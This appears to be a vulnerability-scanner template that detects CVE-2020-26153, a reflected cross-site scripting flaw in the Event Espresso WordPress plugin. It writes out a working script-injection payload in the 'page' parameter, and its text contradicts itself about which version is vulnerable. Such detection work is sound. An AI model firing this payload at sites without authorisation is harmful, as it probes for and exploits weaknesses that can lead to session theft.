id: CVE-2020-26153

info:
  name: Event Espresso Core-Reg 4.10.7.p - Cross-Site Scripting
  author: pikpikcu
  severity: medium
  description: |
    Event Espresso Core-Reg 4.10.7.p is vulnerable to cross-site scripting in wp-content/plugins/event-espresso-core-reg/admin_pages/messages/templates/ee_msg_admin_overview.template.php and allows remote attackers to inject arbitrary web script or HTML via the page parameter.
  impact: |
    Successful exploitation of this vulnerability could lead to the execution of arbitrary script code in the context of the affected website, potentially allowing an attacker to steal sensitive information or perform unauthorized actions.
  remediation: |
    Upgrade to Event Espresso Core-Reg version 4.10.7.p or later to mitigate this vulnerability.
  reference:
    - https://labs.nettitude.com/blog/cve-2020-26153-event-espresso-core-cross-site-scripting/
    - https://github.com/eventespresso/event-espresso-core/compare/4.10.6.p...4.10.7.p
    - https://nvd.nist.gov/vuln/detail/CVE-2020-26153
    - https://github.com/ARPSyndicate/cvemon
    - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2020-26153
    cwe-id: CWE-79
    epss-score: 0.36504
    epss-percentile: 0.96995
    cpe: cpe:2.3:a:eventespresso:event_espresso:*:*:*:*:*:wordpress:*:*
  metadata:
    max-request: 2
    vendor: eventespresso
    product: "event_espresso"
    framework: wordpress
  tags: cve2020,cve,xss,wordpress,wp-plugin,eventespresso,vuln
flow: http(1) && http(2)

http:
  - raw:
      - |
        GET /wp-content/plugins/event-espresso-core-reg/readme.txt HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        internal: true
        words:
          - 'Event Espresso'
          - 'Tested up to:'
        condition: and

  - method: GET
    path:
      - "{{BaseURL}}/wp-content/plugins/event-espresso-core-reg/admin_pages/messages/templates/ee_msg_admin_overview.template.php?page=%22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cb"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"/></script><script>alert(document.domain)</script>'

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 500
# digest: 490a00463044022050474bb1b757adb1732c3fdacf5de32c400f274237397ce7f2d97a6bd964c9cc02203c77f831d4bd9bc42d18805e4d6c3c6e9c0cde2b8aab262146c313a5dd811a6c:922c64590222798bb761d5b6d8e72950